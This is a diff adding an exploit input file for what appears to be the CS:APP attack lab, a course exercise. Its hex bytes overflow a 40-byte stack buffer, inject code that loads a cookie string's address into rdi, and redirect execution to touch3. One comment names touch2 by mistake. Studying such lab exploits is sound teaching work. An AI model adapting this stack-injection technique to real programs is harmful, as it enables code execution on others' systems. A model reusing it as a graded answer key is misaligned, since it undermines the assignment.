@@ -1,0 +1,26 @@
+ /* getbuf function preserves a 40 bytes buffer */
+ /* use our new write_cookie code to fill the buffer */
+
+ /* make a string to store the cookie string: 3cc11c77 */
+ /* this string will start at address 0x5563d148 */
+ 33 63 63 31 31 63 37 37 00 /* "3cc11c77\0", a c-style string */
+
+ /* get the address of the string into rdi */
+ /* because of the storage of the string, the code address starts from 0x5563d148 + 0x9 = 0x5563d151 */
+ 48 c7 c7 48 d1 63 55 /* movq $0x5563d148 , %rdi */
+ c3                   /* ret */
+
+ /* use meaningless bytes to fill the remain buffer space */
+ 37 38 39
+ 30 31 32 33 34 35 36 37 38 39
+ 30 31 32 33 34 35 36 37 38 39
+
+/* overwrite the return address to jump to our code */
+ 51 d1 63 55 00 00 00 00
+
+/* then we need to jump our code to touch3 function */
+/* so that we pass cookie as the argument to touch3 function */
+/* the address of touch2 function is 0x808b43 */
+ fd 89 80 00 00 00 00 00 /* a "ret" code in assemble code */
+ /* in order to fit the 16 bytes return align in x86-64 architecture */
+ 43 8b 80 00 00 00 00 00
